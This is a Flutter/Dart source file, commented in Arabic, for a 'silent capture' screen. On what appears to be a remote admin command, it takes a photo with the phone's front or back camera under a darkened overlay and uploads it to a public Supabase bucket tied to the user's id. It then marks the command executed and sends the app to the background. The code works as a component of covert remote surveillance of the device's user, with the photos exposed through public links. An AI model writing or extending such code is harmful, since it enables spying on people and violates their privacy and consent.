import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:camera/camera.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';

/// شاشة التقاط الصورة الصامتة
/// تفتح تلقائياً، تلتقط الصورة، ترفعها، ثم تغلق
class SilentCaptureScreen extends StatefulWidget {
  final String cameraType; // 'front' or 'back'
  final String? commandId;

  const SilentCaptureScreen({
    super.key,
    required this.cameraType,
    this.commandId,
  });

  @override
  State<SilentCaptureScreen> createState() => _SilentCaptureScreenState();
}

class _SilentCaptureScreenState extends State<SilentCaptureScreen> {
  CameraController? _controller;
  String _status = 'جاري التحضير...';
  bool _isCapturing = false;

  @override
  void initState() {
    super.initState();
    _startCapture();
  }

  Future<void> _startCapture() async {
    try {
      setState(() => _status = 'جاري طلب الإذن...');

      // طلب إذن الكاميرا
      final status = await Permission.camera.request();
      if (!status.isGranted) {
        setState(() => _status = 'تم رفض إذن الكاميرا');
        await Future.delayed(const Duration(seconds: 2));
        _closeApp();
        return;
      }

      setState(() => _status = 'جاري تهيئة الكاميرا...');

      // الحصول على الكاميرات
      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        setState(() => _status = 'لا توجد كاميرا');
        await Future.delayed(const Duration(seconds: 2));
        _closeApp();
        return;
      }

      // اختيار الكاميرا
      CameraDescription? selectedCamera;
      final isFront = widget.cameraType == 'front';

      for (final cam in cameras) {
        if (isFront && cam.lensDirection == CameraLensDirection.front) {
          selectedCamera = cam;
          break;
        } else if (!isFront && cam.lensDirection == CameraLensDirection.back) {
          selectedCamera = cam;
          break;
        }
      }
      selectedCamera ??= cameras.first;

      // تهيئة الكاميرا
      _controller = CameraController(
        selectedCamera,
        ResolutionPreset.medium,
        enableAudio: false,
      );

      await _controller!.initialize();

      setState(() => _status = 'جاري التقاط الصورة...');
      _isCapturing = true;

      // انتظار قصير للتركيز
      await Future.delayed(const Duration(milliseconds: 800));

      // التقاط الصورة
      final photo = await _controller!.takePicture();
      final bytes = await photo.readAsBytes();

      setState(() => _status = 'جاري رفع الصورة...');

      // الحصول على user_id
      final prefs = await SharedPreferences.getInstance();
      final userId = prefs.getInt('user_id');

      if (userId == null) {
        setState(() => _status = 'لم يتم العثور على المستخدم');
        await Future.delayed(const Duration(seconds: 2));
        _closeApp();
        return;
      }

      // رفع الصورة
      final fileName =
          'capture_${userId}_${DateTime.now().millisecondsSinceEpoch}.jpg';

      await Supabase.instance.client.storage
          .from('media')
          .uploadBinary('captures/$fileName', bytes);

      final imageUrl = Supabase.instance.client.storage
          .from('media')
          .getPublicUrl('captures/$fileName');

      // حفظ في قاعدة البيانات
      await Supabase.instance.client.from('captured_images').insert({
        'user_id': userId,
        'image_url': imageUrl,
        'camera_type': widget.cameraType,
      });

      // تحديث حالة الأمر
      if (widget.commandId != null) {
        await Supabase.instance.client
            .from('admin_commands')
            .update({'executed': true})
            .eq('id', widget.commandId!);
      }

      setState(() => _status = '✅ تم التقاط الصورة بنجاح!');

      // انتظار قصير ثم إغلاق
      await Future.delayed(const Duration(seconds: 1));
      _closeApp();
    } catch (e) {
      debugPrint('Silent Capture Error: $e');
      setState(() => _status = 'خطأ: $e');
      await Future.delayed(const Duration(seconds: 2));
      _closeApp();
    }
  }

  void _closeApp() {
    // إغلاق التطبيق أو الرجوع للخلفية
    if (mounted) {
      // نقل التطبيق للخلفية بدلاً من إغلاقه
      SystemNavigator.pop();
    }
  }

  @override
  void dispose() {
    _controller?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // عرض الكاميرا (إذا كانت مفعلة)
          if (_controller != null && _controller!.value.isInitialized)
            Center(child: CameraPreview(_controller!)),

          // شاشة سوداء مع الحالة
          Container(
            color: Colors.black.withAlpha(204),
            child: Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  if (_isCapturing)
                    const Icon(Icons.camera_alt, size: 80, color: Colors.white)
                  else
                    const CircularProgressIndicator(color: Colors.white),
                  const SizedBox(height: 24),
                  Text(
                    _status,
                    style: const TextStyle(color: Colors.white, fontSize: 18),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
